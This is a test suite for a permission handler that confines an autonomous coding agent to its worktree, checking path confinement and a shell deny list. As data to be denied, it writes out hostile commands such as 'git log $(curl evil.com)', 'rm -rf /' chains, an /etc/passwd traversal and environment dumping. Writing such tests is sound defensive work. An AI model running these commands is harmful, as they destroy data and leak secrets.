import { afterAll, afterEach, beforeEach, describe, expect, test } from 'bun:test';
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'fs';
import { join } from 'path';
import { tmpdir } from 'os';
import type { PermissionRequest } from '@github/copilot-sdk';
import {
    canonicalize,
    createAutonomousPermissionHandler,
    decidePermission,
    evaluatePathAccess,
    evaluateShellRequest,
} from '../maintenance/autonomousPermissionHandler';

// Deliberately *not* bots/DayTrader/data - that path is itself one of the
// blocked patterns under test, so worktree fixtures must live elsewhere.
const SCRATCH_DIR = join(tmpdir(), 'daytrader-permission-test-scratch');
let worktree: string;
let outsideDir: string;

beforeEach(() => {
    mkdirSync(SCRATCH_DIR, { recursive: true });
    worktree = mkdtempSync(join(SCRATCH_DIR, 'worktree-'));
    outsideDir = mkdtempSync(join(SCRATCH_DIR, 'outside-'));
    mkdirSync(join(worktree, 'lib'), { recursive: true });
    writeFileSync(join(worktree, 'lib', 'thing.ts'), 'export const x = 1;\n');
    mkdirSync(join(worktree, '.git'), { recursive: true });
    writeFileSync(join(worktree, '.git', 'HEAD'), 'ref: refs/heads/main\n');
    mkdirSync(join(worktree, 'node_modules', 'x'), { recursive: true });
    writeFileSync(join(worktree, 'bot.env'), 'PASSWORD=secret\n');
    writeFileSync(join(worktree, '.env'), 'SECRET=1\n');
    mkdirSync(join(worktree, 'bots', 'DayTrader', 'data'), { recursive: true });
    writeFileSync(join(worktree, 'bots', 'DayTrader', 'data', 'registry.sqlite'), 'binary-ish');
});

afterEach(() => {
    rmSync(worktree, { recursive: true, force: true });
    rmSync(outsideDir, { recursive: true, force: true });
});

afterAll(() => {
    rmSync(SCRATCH_DIR, { recursive: true, force: true });
});

describe('autonomousPermissionHandler - path canonicalization and confinement', () => {
    test('approves a read/write within the worktree', () => {
        const result = evaluatePathAccess(worktree, join(worktree, 'lib', 'thing.ts'));
        expect(result.allowed).toBe(true);
    });

    test('does not reject an isolated worktree merely because its host parent is a runtime data directory', () => {
        const nested = join(SCRATCH_DIR, 'bots', 'DayTrader', 'data', 'autonomous-worktrees', 'work');
        mkdirSync(join(nested, 'lib'), { recursive: true });
        expect(evaluatePathAccess(nested, join(nested, 'lib', 'thing.ts')).allowed).toBe(true);
        expect(evaluatePathAccess(nested, join(nested, 'bots', 'DayTrader', 'data', 'state.json')).allowed).toBe(false);
    });

    test('maps the Copilot runtime /workspace alias into the isolated worktree', () => {
        expect(evaluatePathAccess(worktree, '/workspace/lib/thing.ts').allowed).toBe(true);
    });

    test('approves a path that does not exist yet (a new file the agent is about to create)', () => {
        const result = evaluatePathAccess(worktree, join(worktree, 'lib', 'brand-new-file.ts'));
        expect(result.allowed).toBe(true);
    });

    test('rejects a path outside the worktree entirely', () => {
        const result = evaluatePathAccess(worktree, join(outsideDir, 'anything.ts'));
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('escapes');
    });

    test('rejects directory traversal (../) that would otherwise resolve outside the worktree', () => {
        const result = evaluatePathAccess(worktree, join(worktree, 'lib', '..', '..', 'perm-outside-anything', 'x.ts'));
        expect(result.allowed).toBe(false);
    });

    test('rejects a symlink inside the worktree that points outside it (canonicalization defeats the trick)', () => {
        const linkPath = join(worktree, 'lib', 'escape-link');
        symlinkSync(outsideDir, linkPath);
        const result = evaluatePathAccess(worktree, join(linkPath, 'secret.txt'));
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('escapes');
    });

    test('rejects .git even though it is inside the worktree', () => {
        const result = evaluatePathAccess(worktree, join(worktree, '.git', 'HEAD'));
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('blocked pattern');
    });

    test('rejects node_modules even though it is inside the worktree', () => {
        const result = evaluatePathAccess(worktree, join(worktree, 'node_modules', 'x'));
        expect(result.allowed).toBe(false);
    });

    test('rejects bot.env and .env', () => {
        expect(evaluatePathAccess(worktree, join(worktree, 'bot.env')).allowed).toBe(false);
        expect(evaluatePathAccess(worktree, join(worktree, '.env')).allowed).toBe(false);
    });

    test('rejects the DayTrader runtime data directory', () => {
        const result = evaluatePathAccess(worktree, join(worktree, 'bots', 'DayTrader', 'data', 'registry.sqlite'));
        expect(result.allowed).toBe(false);
    });

    test('rejects credential/private-key-shaped paths anywhere', () => {
        expect(evaluatePathAccess(worktree, join(worktree, 'lib', 'id_rsa')).allowed).toBe(false);
        expect(evaluatePathAccess(worktree, join(worktree, 'lib', 'server.pem')).allowed).toBe(false);
        expect(evaluatePathAccess(worktree, join(worktree, 'lib', 'private_key.txt')).allowed).toBe(false);
        expect(evaluatePathAccess(worktree, join(worktree, 'credentials', 'aws')).allowed).toBe(false);
    });

    test('rejects an empty path', () => {
        expect(evaluatePathAccess(worktree, '').allowed).toBe(false);
    });

    test('canonicalize resolves a not-yet-existing nested path against its nearest real ancestor', () => {
        const result = canonicalize(join(worktree, 'lib', 'deep', 'nested', 'new-file.ts'));
        expect(result.startsWith(canonicalize(worktree))).toBe(true);
        expect(result.endsWith(join('deep', 'nested', 'new-file.ts'))).toBe(true);
    });
});

describe('autonomousPermissionHandler - shell allow/deny policy', () => {
    function shell(fullCommandText: string, overrides: Partial<Parameters<typeof evaluateShellRequest>[0]> = {}) {
        const [identifier] = fullCommandText.trim().split(/\s+/);
        return evaluateShellRequest(
            {
                fullCommandText,
                hasWriteFileRedirection: false,
                commandSegments: [{ identifier: identifier ?? '', fullCommandText }],
                ...overrides,
            },
            worktree
        );
    }

    test('allows bounded read-only git inspection subcommands', () => {
        expect(shell('git status').allowed).toBe(true);
        expect(shell('git diff --stat').allowed).toBe(true);
        expect(shell('git log -n 5').allowed).toBe(true);
        expect(shell('git show HEAD').allowed).toBe(true);
        expect(shell('git rev-parse HEAD').allowed).toBe(true);
    });

    test('normalizes a runtime command identifier that includes its git subcommand', () => {
        const result = evaluateShellRequest(
            {
                fullCommandText: 'git status',
                hasWriteFileRedirection: false,
                commandSegments: [{ identifier: 'git status', fullCommandText: 'git status' }],
                possiblePaths: [],
            },
            worktree
        );
        expect(result.allowed).toBe(true);
    });

    test('allows the safe git --no-pager global option before an inspection subcommand', () => {
        expect(shell('git --no-pager status').allowed).toBe(true);
        expect(shell('git --no-pager log -n 5').allowed).toBe(true);
    });

    test('denies mutating/remote git subcommands', () => {
        for (const sub of ['push', 'fetch', 'pull', 'reset', 'clean', 'checkout', 'switch', 'rebase', 'merge', 'cherry-pick', 'commit']) {
            const result = shell(`git ${sub}`);
            expect(result.allowed).toBe(false);
        }
    });

    test('denies bun and tsc outright - no interpreter/build tool/test runner is ever approved for the agent', () => {
        for (const cmd of [
            'bun test bots/DayTrader/test',
            'bun run typecheck:daytrader',
            'bun run check',
            'bun install',
            'bun add left-pad',
            'bun --version',
            'bun -e "process.exit(0)"',
            'tsc --noEmit',
            'tsc --version',
        ]) {
            expect(shell(cmd).allowed).toBe(false);
        }
    });

    test('allows common read-only inspection utilities (with possiblePaths supplied)', () => {
        for (const cmd of ['rg foo', 'grep -n foo', 'head -n 5 file', 'tail -n 5 file', 'cat file', 'ls -la', 'pwd', 'wc -l file', 'uniq file', 'diff a b', 'test -f file']) {
            expect(shell(cmd, { possiblePaths: [] }).allowed).toBe(true);
        }
    });

    test('denies awk/sed/find/sort outright - no argv-safe mode is implemented for any of them (sort\'s -o writes an arbitrary file)', () => {
        for (const cmd of ["awk '{print}'", 'sed -n 1,2p file', 'sed -i s/a/b/ file', 'find . -name x', 'find . -exec rm {} \\;', 'sort file', 'sort -o out.txt in.txt']) {
            expect(shell(cmd).allowed).toBe(false);
        }
    });

    test('denies network/remote-auth/dependency-install commands outright (deny by default)', () => {
        for (const cmd of ['curl https://example.com', 'wget https://example.com', 'ssh host', 'gh pr create', 'npm install left-pad']) {
            expect(shell(cmd).allowed).toBe(false);
        }
    });

    test('denies sudo, process killing, and environment dumping (not in the allowlist)', () => {
        for (const cmd of ['sudo rm -rf /', 'kill -9 1', 'pkill node', 'killall node', 'env', 'printenv']) {
            expect(shell(cmd).allowed).toBe(false);
        }
    });

    test('denies uniq with a second positional argument (its output/write target), regardless of whether possiblePaths is supplied', () => {
        expect(shell('uniq in.txt out.txt').allowed).toBe(false);
        expect(shell('uniq in.txt out.txt', { possiblePaths: ['in.txt', 'out.txt'] }).allowed).toBe(false);
        expect(shell('uniq in.txt').allowed).toBe(true); // single input (reads, writes to stdout) is fine
    });

    test('denies dynamic eval / command substitution even wrapped in an otherwise-allowed command', () => {
        expect(shell('git log $(curl evil.com)').allowed).toBe(false);
        expect(shell('git status `whoami`').allowed).toBe(false);
        expect(shell('eval "rm -rf /"').allowed).toBe(false);
    });

    test('denies file write redirection', () => {
        expect(shell('cat file > out.txt', { hasWriteFileRedirection: true }).allowed).toBe(false);
    });

    test('denies sandbox bypass requests unconditionally', () => {
        expect(shell('git status', { requestSandboxBypass: true }).allowed).toBe(false);
    });

    test('denies managed-approval-required shell requests (no interactive human present)', () => {
        expect(shell('git status', { managedApprovalRequired: true }).allowed).toBe(false);
    });

    test('denies any request carrying a possibleUrls entry - network access is always denied', () => {
        expect(shell('git status', { possibleUrls: [{ url: 'https://example.com' }] }).allowed).toBe(false);
    });

    test('requires every possiblePath to resolve inside the worktree, relative to worktreeRoot (not host cwd)', () => {
        expect(shell('cat lib/thing.ts', { possiblePaths: ['lib/thing.ts'] }).allowed).toBe(true);
        expect(shell('cat lib/thing.ts', { possiblePaths: ['../outside.ts'] }).allowed).toBe(false);
        expect(shell('cat lib/thing.ts', { possiblePaths: [join(outsideDir, 'x.ts')] }).allowed).toBe(false);
        expect(shell('cat lib/thing.ts', { possiblePaths: ['bot.env'] }).allowed).toBe(false);
        expect(shell('cat lib/thing.ts', { possiblePaths: ['.git/HEAD'] }).allowed).toBe(false);
    });

    describe('fail-closed when the runtime supplies no possiblePaths at all', () => {
        test('denies grep/rg with arguments - the first argument is a pattern, not a path, so it cannot be self-parsed safely', () => {
            expect(shell('grep foo lib/thing.ts').allowed).toBe(false);
            expect(shell('rg foo lib/thing.ts').allowed).toBe(false);
        });

        test('self-parses cat/head/tail/ls/wc/uniq/diff/test argv as paths and validates each one against the worktree', () => {
            expect(shell('cat lib/thing.ts').allowed).toBe(true);
            expect(shell('cat bot.env').allowed).toBe(false);
            expect(shell('cat .git/HEAD').allowed).toBe(false);
            expect(shell('cat ../outside.ts').allowed).toBe(false);
            expect(shell('cat ' + join(outsideDir, 'x.ts')).allowed).toBe(false);
            expect(shell('head -n 5 lib/thing.ts').allowed).toBe(true);
            expect(shell('diff lib/thing.ts bot.env').allowed).toBe(false);
        });

        test('commands with zero arguments never need possiblePaths at all', () => {
            expect(shell('pwd').allowed).toBe(true);
            expect(shell('ls').allowed).toBe(true);
        });

        test('denies a flag that could carry a separate/attached value this module cannot distinguish from a path', () => {
            expect(shell('wc --files0-from=lib/thing.ts').allowed).toBe(false);
            expect(shell('grep --file=lib/thing.ts foo').allowed).toBe(false);
        });

        test('denies shell metacharacters or traversal smuggled into a self-parsed argument', () => {
            expect(shell('cat $(whoami)').allowed).toBe(false);
            expect(shell('cat lib/../../etc/passwd').allowed).toBe(false);
        });

        test('an explicit empty possiblePaths array is NEVER blindly trusted for the self-parseable command subset - this module always independently self-parses their own arguments too', () => {
            // Before this was fixed, a runtime that (correctly or
            // incorrectly) reported zero possiblePaths for a command whose
            // own argv plainly named a credentials file would have been
            // approved outright, with no independent corroboration at
            // all. Self-parsing now always runs for this safe command
            // subset, regardless of what possiblePaths says.
            expect(shell('cat bot.env', { possiblePaths: [] }).allowed).toBe(false);
            expect(shell('cat lib/thing.ts', { possiblePaths: [] }).allowed).toBe(true);
        });
    });

    test('a single disallowed segment rejects the whole request even if other segments are allowed', () => {
        const result = evaluateShellRequest(
            {
                fullCommandText: 'git status && rm -rf /',
                hasWriteFileRedirection: false,
                commandSegments: [
                    { identifier: 'git', fullCommandText: 'git status' },
                    { identifier: 'rm', fullCommandText: 'rm -rf /' },
                ],
            },
            worktree
        );
        expect(result.allowed).toBe(false);
    });

    test('denies a request with no parsed command segments at all', () => {
        expect(evaluateShellRequest({ fullCommandText: '', hasWriteFileRedirection: false }, worktree).allowed).toBe(false);
    });

    describe('fail-closed fallback when commandSegments is absent', () => {
        test('denies chained/control-operator text even with commands[] present', () => {
            const result = evaluateShellRequest(
                {
                    fullCommandText: 'git status && rm -rf /',
                    hasWriteFileRedirection: false,
                    commands: [
                        { identifier: 'git', readOnly: true },
                        { identifier: 'rm', readOnly: false },
                    ],
                },
                worktree
            );
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('control operators');
        });

        test('denies when more than one command identifier was parsed but no segments were provided', () => {
            const result = evaluateShellRequest(
                {
                    fullCommandText: 'cat file',
                    hasWriteFileRedirection: false,
                    commands: [
                        { identifier: 'cat', readOnly: true },
                        { identifier: 'grep', readOnly: true },
                    ],
                },
                worktree
            );
            expect(result.allowed).toBe(false);
        });

        test('denies a single command that commands[] reports as not read-only', () => {
            const result = evaluateShellRequest(
                {
                    fullCommandText: 'cat file',
                    hasWriteFileRedirection: false,
                    commands: [{ identifier: 'cat', readOnly: false }],
                },
                worktree
            );
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('not reported read-only');
        });

        test('denies a single unambiguous git command via the fallback - subcommand safety cannot be verified without segments', () => {
            const result = evaluateShellRequest(
                {
                    fullCommandText: 'git status',
                    hasWriteFileRedirection: false,
                    commands: [{ identifier: 'git', readOnly: true }],
                },
                worktree
            );
            expect(result.allowed).toBe(false);
            expect(result.reason).toContain('requires parsed segments');
        });

        test('approves a single unambiguous read-only bare utility with no control operators via the fallback', () => {
            const result = evaluateShellRequest(
                {
                    fullCommandText: 'cat lib/thing.ts',
                    hasWriteFileRedirection: false,
                    commands: [{ identifier: 'cat', readOnly: true }],
                },
                worktree
            );
            expect(result.allowed).toBe(true);
        });

        test('denies when the fallback commands[] array has zero entries', () => {
            const result = evaluateShellRequest(
                { fullCommandText: 'cat file', hasWriteFileRedirection: false, commands: [] },
                worktree
            );
            expect(result.allowed).toBe(false);
        });
    });

    test('defense in depth: denies even a properly-segmented single segment whose raw text still looks chained', () => {
        // Simulates a parser gap: the raw text clearly chains two commands
        // but only one segment was returned.
        const result = evaluateShellRequest(
            {
                fullCommandText: 'cat file; rm -rf /',
                hasWriteFileRedirection: false,
                commandSegments: [{ identifier: 'cat', fullCommandText: 'cat file; rm -rf /' }],
            },
            worktree
        );
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('control operators');
    });
});

describe('autonomousPermissionHandler - full decidePermission coverage of every request kind', () => {
    test('approves an in-bounds read and write', () => {
        const read: PermissionRequest = { kind: 'read', intention: 'inspect', path: join(worktree, 'lib', 'thing.ts') } as PermissionRequest;
        const write: PermissionRequest = {
            kind: 'write',
            intention: 'edit',
            fileName: join(worktree, 'lib', 'thing.ts'),
            diff: '',
            canOfferSessionApproval: false,
        } as PermissionRequest;
        expect(decidePermission(worktree, read).allowed).toBe(true);
        expect(decidePermission(worktree, write).allowed).toBe(true);
    });

    test('resolves a direct relative read/write path against worktreeRoot, never the host process cwd', () => {
        const read: PermissionRequest = { kind: 'read', intention: 'inspect', path: join('lib', 'thing.ts') } as PermissionRequest;
        const write: PermissionRequest = {
            kind: 'write',
            intention: 'edit',
            fileName: join('lib', 'thing.ts'),
            diff: '',
            canOfferSessionApproval: false,
        } as PermissionRequest;
        expect(decidePermission(worktree, read).allowed).toBe(true);
        expect(decidePermission(worktree, write).allowed).toBe(true);

        // A relative path that would only exist under the host's own cwd
        // (e.g. this test file's own directory) must never be resolved
        // there instead of the worktree - it must be judged purely against
        // worktreeRoot, so a relative traversal out of it is still denied.
        const escaping: PermissionRequest = { kind: 'read', intention: 'inspect', path: join('..', 'outside-relative.ts') } as PermissionRequest;
        expect(decidePermission(worktree, escaping).allowed).toBe(false);

        const blocked: PermissionRequest = { kind: 'read', intention: 'inspect', path: join('bot.env') } as PermissionRequest;
        expect(decidePermission(worktree, blocked).allowed).toBe(false);
    });

    test('denies mcp, url, memory, custom-tool, hook, extension-management, factory, extension-permission-access unconditionally', () => {
        const kinds: PermissionRequest['kind'][] = [
            'mcp',
            'url',
            'memory',
            'custom-tool',
            'hook',
            'extension-management',
            'factory',
            'extension-permission-access',
        ];
        for (const kind of kinds) {
            const request = { kind } as unknown as PermissionRequest;
            const decision = decidePermission(worktree, request);
            expect(decision.allowed).toBe(false);
        }
    });

    test('denies managedApprovalRequired regardless of kind', () => {
        const request = {
            kind: 'read',
            intention: 'inspect',
            path: join(worktree, 'lib', 'thing.ts'),
            managedApprovalRequired: true,
        } as PermissionRequest;
        expect(decidePermission(worktree, request).allowed).toBe(false);
    });

    test('denies requestSandboxBypass on read/write', () => {
        const request = {
            kind: 'read',
            intention: 'inspect',
            path: join(worktree, 'lib', 'thing.ts'),
            requestSandboxBypass: true,
        } as PermissionRequest;
        expect(decidePermission(worktree, request).allowed).toBe(false);
    });
});

describe('autonomousPermissionHandler - handler factory', () => {
    test('returns approve-once for allowed requests and reject with feedback for denied ones, and reports an audit entry', async () => {
        const audit: Array<{ kind: string; allowed: boolean }> = [];
        const handler = createAutonomousPermissionHandler(worktree, entry => audit.push(entry));
        const allowedResult = await handler(
            { kind: 'read', intention: 'inspect', path: join(worktree, 'lib', 'thing.ts') } as PermissionRequest,
            { sessionId: 's1' }
        );
        const deniedResult = await handler({ kind: 'mcp' } as unknown as PermissionRequest, { sessionId: 's1' });

        expect(allowedResult).toEqual({ kind: 'approve-once' });
        expect(deniedResult.kind).toBe('reject');
        expect(audit.map(entry => ({ kind: entry.kind, allowed: entry.allowed }))).toEqual([
            { kind: 'read', allowed: true },
            { kind: 'mcp', allowed: false },
        ]);
    });
});
